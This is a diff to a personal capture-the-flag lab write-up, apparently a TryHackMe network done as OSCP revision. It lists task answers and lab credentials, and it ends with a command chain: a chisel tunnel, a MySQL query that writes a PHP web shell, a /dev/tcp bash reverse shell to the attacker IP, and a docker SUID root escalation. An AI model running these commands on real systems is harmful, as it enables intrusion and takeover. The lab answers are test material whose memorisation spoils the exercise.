@@ -7,8 +7,15 @@ Better Description:
 Goals: OSCP revision, demonstrate how far I have come since Throwback..
 Learnt:
 - Tie functionality of pages together
+- deepce is linpeas for docker containers
+- Chisel
+- Golang compilation netty gritty
+- More Situational Awareness or may the trench that is Dunning Kroger
+- Walk the the Webserver directory on at a time before/after/due second reverse shell
 
 Returning to this after lots of Hack the Box I decided to follow along with [Alh4zr3d](https://www.youtube.com/watch?v=PqnnKMU3XMk) purely to fit with my work schedule that include another siz hours plus after this. I need mentorship and I need practical experience that is less-head-smashing-problem-solving-stress to pace out the the marathon of learning everything for the exam I need. Some humor and Cthulu mythos is great addition to my day. 
+
+Tasks 0 - [Part 1 Al](https://www.youtube.com/watch?v=PqnnKMU3XMk)
 
 ## Initial Recon
 
@@ -123,10 +130,11 @@ Using LFI on the development domain read the above file. What are the credential
 admin:DBManagerLogin
 ```
 
-Because the lfi you can then grab all the files!
+Because the lfi you can then grab all the files! Be aware of the difference.
 
 ![](passwordchanges.png)
 
+There is a non-real world vulnerablity with a use of PHP super global variable creation for view 
 ![](vistors.png)
 
 [Alh4zr3d](https://www.youtube.com/channel/UCz-Z-d2VPQXHGkch0-_KovA) spotted this I just LFI rather than log in
@@ -161,5 +169,118 @@ N/A
 ![](docker.png)
 
 #### Task 15
-2:41
-[](https://www.youtube.com/watch?v=PqnnKMU3XMk)
+
+N/A
+
+![](cgroups.png)
+
+![](cgroupcat.png)
+
+## Task 16 
+
+The best method is `nc -zv 192.168.100.1 1-65535`
+
+What is the Default Gateway for the Docker Container?
+```
+192.168.100.1
+```
+What is the high web port open in the container gateway?
+```
+8080
+```
+What is the low database port open in the container gateway?
+```
+3306
+```
+
+For those following along with the Video
+![](chiselworksthisway.png)
+
+## Task 17
+
+Lesson, walk up the webserver directory, this may not have got picked up.
+
+![](db_connect.png)
+What is the server address of the remote database?
+```
+192.168.100.1
+```
+What is the password of the remote database?  
+```
+!123SecureAdminDashboard321!
+```
+What is the username of the remote database?  
+```
+admin
+```
+What is the database name of the remote database?  
+```
+DashboardDB
+```
+What username can be found within the database itself?
+```
+gurag
+```
+
+![](mysqldbpass.png)
+
+#### Task 18 
+
+![](awesompx.png)
+
+What user is the database running as?
+```
+www-data
+```
+
+## Task 19 
+
+`find / -perm -u=s -type f 2>/dev/null`
+
+[Docker should never have suid bit set.](https://gtfobins.github.io/gtfobins/docker/#shell)
+
+What is the full path of the binary with an SUID bit set on L-SRV01?
+```
+/usr/bin/docker
+```
+What is the full first line of the exploit for the SUID bit?
+```
+sudo install -m =xs $(which docker) .
+```
+
+![](coolme.png)
+
+```bash
+sudo install -m =xs $(which docker) .
+./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+```
+
+## Task 21
+
+What non-default user can we find in the shadow file on L-SRV01?
+```
+linux-admin
+```
+
+## To Get Here
+
+
+```bash
+# Setup proxychains and chisel
+./chisel server -p 8888 --reverse
+# curl chisel run client 
+curl http://10.50.103.91/chisel -o chisel
+./chisel client 10.50.103.91:8888 R:socks
+
+proxychains mysql -h 192.168.100.1 -u admin -p
+# !123SecureAdminDashboard321!
+use DashboardDB;
+# required create RCE on docker host
+select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/nvmcmd.php';
+
+proxychains curl "http://192.168.100.1:8080/shell.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/445+<%261'"
+
+sudo install -m =xs $(which docker) .
+./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+
+```
